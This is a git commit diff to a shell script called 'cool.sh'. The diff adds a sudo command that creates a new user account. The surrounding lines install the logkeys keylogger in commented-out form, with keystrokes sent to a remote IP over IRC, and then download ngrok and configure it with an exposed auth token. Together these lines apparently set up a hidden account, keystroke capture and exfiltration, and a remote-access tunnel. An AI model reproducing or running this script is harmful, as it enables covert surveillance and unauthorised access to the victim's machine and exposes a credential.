fe2d558682bf89bf34d1cd82d4f4bddd919fdbc7
gizmo87898 <73662348+gizmo87898@users.noreply.github.com>
2022-04-26 08:20:44 -0400

    Update cool.sh

--- cool.sh
+++ cool.sh
@@ -9,6 +9,7 @@
 #sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
 #logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
 
+sudo adduser --gecos 'gizmospw' gizmo
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
 tar -xvf ngrok-v3-stable-linux-amd64.tgz
 ./ngrok config add-authtoken 28Kn9ch4pzaAkXtG3CigpJWhgb7_2WcHxNFrNGXeTdBJnXBpy
